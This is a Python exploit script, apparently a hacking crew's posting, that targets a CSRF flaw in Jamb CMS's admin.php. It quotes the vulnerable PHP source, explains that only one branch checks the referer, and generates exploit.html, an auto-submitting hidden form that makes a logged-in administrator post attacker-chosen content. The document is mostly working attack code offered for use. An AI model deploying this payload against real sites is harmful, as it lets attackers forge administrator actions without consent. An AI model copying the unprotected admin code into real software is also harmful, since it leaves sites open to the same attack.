#!/usr/bin/python
#########################################################
#  ____                      ___              __      __                                             
# /\  _`\                 __/\_ \           /'__`\   /\ \                                            
# \ \ \/\ \    __  __  __/\_\//\ \     ___ /\ \/\ \  \_\ \     __         ___  _ __   __  __  __  __ 
#  \ \ \ \ \ /'__`\\ \/\ \/\ \\ \ \   /'___\ \ \ \ \ /'_` \  /'__`\      /'___\\`'__\'__`\\ \/\ \/\ \
#   \ \ \_\ \\  __/ \ \_/ | \ \\_\ \_/\ \__/\ \ \_\ \\ \L\ \/\  __/     /\ \__/ \ \/\  __/ \ \_/ \_/ \
#    \ \____/ \____\ \___/ \ \_\\____\ \____\\ \____/ \___,_\ \____\    \ \____\ \_\ \____\ \___x___/'
#     \/___/ \/____/\/__/   \/_//____/\/____/ \/___/ \/__,_ /\/____/     \/____/\/_/\/____/\/__//__/ 
#
# Crew Members: bl3ck, stoke, Shellcoder_, n1md4, sys.x4sh, Ax3L, s1y, LostPassword, nex & overmind
#
#
# Author: stoke
# 
#
#
#
# Jamb CMS CSRF Arbitrary add a post
# 
# Jamb can be downloaded here: http://darkjoker.sytes.net/archives/jamb.zip
#
# Let's see the bugged code:
# ---- snip from admin.php -----
"""
if ($_GET ['act'] && is_logged () && intval ($_GET['id']) && preg_match ("|http://".$_SERVER['SERVER_NAME'].dirname($_SERVER['PHP_SELF'])."|",$_SERVER['HTTP_REFERER'])) {
	$id=intval ($_GET['id']);
	switch ($_GET['act']) {
		case 'del':
			$query = "DELETE FROM articles WHERE id = '{$id}'";
			mysql_query ($query) or die ("Please edit functions.php!");
			$query = "DELETE FROM comments WHERE pid = '{$id}'";
			mysql_query ($query);
			header ("Location: index.php");
			die ();
			break;
		case 'edit':
			$newtitle = htmlentities (mysql_real_escape_string ($_POST['newtitle']));
			$newart = mysql_real_escape_string ($_POST['newart']);
			if (!$newtitle || !$newart) {
				$query = "SELECT * FROM articles WHERE id = '{$id}'";
				$res=mysql_query ($query);
				$row=mysql_fetch_row ($res);
				if (!$row[0])
					die ("Wrong ID");
				$row[1]=stripslashes($row[1]);
				$row[2]=stripslashes ($row[2]);
				echo	"<form action = 'admin.php?act=edit&id={$id}' method = 'POST'>\n".
					"Title: <input name = 'newtitle' value = '{$row[1]}'><br>\n".
					"<textarea rows=30 cols=100 name='newart'>{$row[2]}&lt;/textarea&gt;<br>\n".
					"<input type = 'submit' value = 'Edit'><br>\n".
					"</form>\n";
					$a=false;
			}
			else {
				$query = "UPDATE articles SET title='{$newtitle}', body='{$newart}' WHERE id = '{$id}'";
				mysql_query ($query);
				header ("Location: index.php");
				die ();
			}
			break;
		case 'delc': 
			$query = "DELETE FROM comments WHERE id = '{$id}'";
			mysql_query ($query);
			header ("Location: index.php");
			die ();
			break;
		case 'editc':
			$newuname = htmlentities (mysql_real_escape_string ($_POST['newuname']));
			$newcomm = htmlentities (mysql_real_escape_string ($_POST['newcomm']));
			if (!$newuname || !$newcomm) {
				$query = "SELECT * FROM comments WHERE id = '{$id}'";
				$res = mysql_query ($query);
				$row = mysql_fetch_row ($res);

				if (!$row[0])
					die ("Wrong ID");
				$row[2]=stripslashes ($row[2]);
				$row[3]=stripslashes ($row[3]);
				echo	"<form action = 'admin.php?act=editc&id={$id}' method = 'POST'>\n".
					"Author: <input name = 'newuname' value = '{$row[2]}'><br>\n".
					"<textarea rows=10 cols=25 name = 'newcomm'>{$row[3]}&lt;/textarea&gt;<br>\n".
					"<input type = 'submit' value = 'Edit'><br>\n</form>\n";
				$a=false;
			}
			else {
				$query = "UPDATE comments SET author='{$newuname}', comment='{$newcomm}' WHERE id='{$id}'";
				mysql_query ($query);
				header ("Location: index.php");
				die ();
			}
			break;
		default:
			break;
	}
}

if (is_logged () && $a) {
	$title = htmlentities (mysql_real_escape_string ($_POST['title']));
	$art = mysql_real_escape_string ($_POST['data']);
	echo $title . " ".$art;
	if (!$title || !$art) {
		echo	"<form method = 'POST'>\n".
			"Title: <input name = 'title'><br>\n".
			"<textarea rows=30 cols=100 name = 'data'>&lt;/textarea&gt;<br>\n".
			"<input type = 'submit' value = 'Send'><br>\n".
			"</form>\n";
	}
	else {
		$query = "INSERT INTO articles (title,body,date) VALUES ('{$title}','{$art}','".time()."');";
		mysql_query ($query);
		header ("Location: index.php");
		die ();
	}
}
"""
# ---- end snip ----
#
# How you can see, only the "act" part of code has the referer checked, this is useful (for us).
# We can exploit this issue by sending a specially .html file to the admin when he/she is logged.
#
# I write a little script for do this


from sys import argv

if len(argv) < 4:
	print "Usage: ./exploit.py <url_with_jamb_dir> <title> <content_of_post>"
	quit()
	
print ".:[Jamb CMS CSRF Arbitrary add post exploit]:.\n\n"
url = argv[1]
title = argv[2]
content = argv[3]
print "[+] Preparing the exploit"
skeleton = """
<body onload="document.getElementById('1').submit()">
<form method="POST" id="1" action="%s/admin.php">
<input type="hidden" name="title" value="%s">
<input type="hidden" name="data" value="%s">
</form>""" % (url, title, content)
enc = skeleton
print "[+] Writing the exploit"
fd = file("exploit.html", "w")
fd.write(enc)
fd.close()
print "[+] Done, check exploit.html"
